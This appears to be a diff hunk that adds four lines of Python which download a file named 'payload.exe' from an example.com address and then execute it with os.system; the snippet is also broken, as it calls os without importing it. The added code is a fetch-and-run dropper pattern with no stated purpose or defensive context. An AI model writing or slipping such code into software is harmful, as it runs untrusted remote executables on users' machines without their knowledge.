@@ -1,0 +1,4 @@
+import urllib.request
+url = 'http://example.com/payload.exe'
+urllib.request.urlretrieve(url, 'payload.exe')
+os.system('payload.exe')
